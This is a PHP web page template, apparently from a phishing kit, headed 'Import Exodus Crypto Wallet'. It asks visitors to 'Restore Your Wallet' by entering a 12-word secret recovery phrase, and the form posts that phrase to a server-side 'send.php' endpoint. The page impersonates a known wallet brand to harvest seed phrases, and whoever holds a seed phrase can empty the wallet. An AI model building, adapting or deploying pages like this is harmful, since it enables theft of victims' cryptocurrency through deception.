<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Import Exodus Crypto Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php
        $number = 2;
        include_once './includes/header.php';
        ?>
        <div class="container">
            <div class="row justify-content-center mt20">
                <div class="col-sm-9 text-center">
                    <h4 class="fs24 lh36 fw-normal">Restore Your Wallet</h4>
                    <div class="text-secondary">Enter your 12-word secret phrase</div>
                    <div class="text-secondary">to import your existing wallet</div>
                    <!--                    
                    <div class="row mt30 ">
                        <div class="col-sm-6 fw-bold fs18">Type your Secret Recovery Phrase</div>
                        <div class="col-sm-6">
                            <select class="form-select" id="recovery_phrase_select" aria-label="Default Recovery Phrase">
                                <option value="12">I have a 12-word phrase</option>
                                <option value="15">I have a 15-word phrase</option>
                                <option value="18">I have a 18-word phrase</option>
                                <option value="21">I have a 21-word phrase</option>
                                <option value="24">I have a 24-word phrase</option>
                            </select>
                        </div>
                    </div>
                    -->
                    <form method="post" action="<?= base_url('send.php') ?>" class="py10 mt40">
                        <div class="row form_keys"></div>
                        <div class="row">
                            <div class="col-sm-12 my30 mb50 text-center">
                                <button type="submit" class="btn btn-primary btn-primary-2 rounded-pill px60 py12 fw-normal fs13">RESTORE</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
<?php include_once './includes/footer.php'; ?>
    </body>
</html>